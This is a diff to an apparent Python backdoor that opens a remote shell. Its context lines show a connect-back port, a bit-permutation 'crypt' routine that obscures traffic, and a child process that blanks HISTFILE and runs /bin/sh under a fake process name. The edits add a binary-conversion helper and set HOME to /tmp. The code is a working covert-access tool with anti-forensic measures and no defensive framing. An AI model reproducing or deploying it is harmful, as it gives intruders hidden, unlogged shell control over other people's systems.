@@ -9,13 +9,16 @@ port  = 8888                  ## PORT to connect to
 h, w  = 36, 111               ## terminal size == 111x36
 
 def crypt( xxx, key = [ 7,6,5,4,3,2,1,0 ] ):
+    def bin( n ):
+        return ''.join( map( lambda y: str((n >> y) & 1), range( 7 , -1, -1 ) ) )
+
     def perm( c ):
         """ This function is remap one byte to another
             with bit-permutations.
-            perm^2 === 1
+            assert( perm^2 === 1 )
         """
-        s = bin( ord( c ) )[ 2: ].rjust( 8, '0' )                                  ## 3 --> 00000011
-        return chr( int( ''.join([ s[ key[ i ] ] for i in xrange( 8 ) ]), 2 ) )    ## return char( int( 11000000 ) )
+        s = bin( ord( c ) )                                                        ## 3 --> 00000011
+        return chr( int( ''.join([ s[ key[ i ] ] for i in xrange( 8 ) ]), 2 ) )    ## return chr( int( 11000000 ) )
     return ''.join( map( perm, xxx ) )
 
 
@@ -57,7 +60,9 @@ if not pid: # Child
     except:
         pass
 
-    os.environ.update({ 'HISTFILE':'', 'TERM':'linux' }) ## usefull env vars
+    os.environ.update({ 'HISTFILE' : '',
+                        'TERM'     : 'linux',
+                        'HOME'     : '/tmp'    })        ## usefull env vars
     os.execv( '/bin/sh', [ name ] )                      ## bash with fake name
 
 
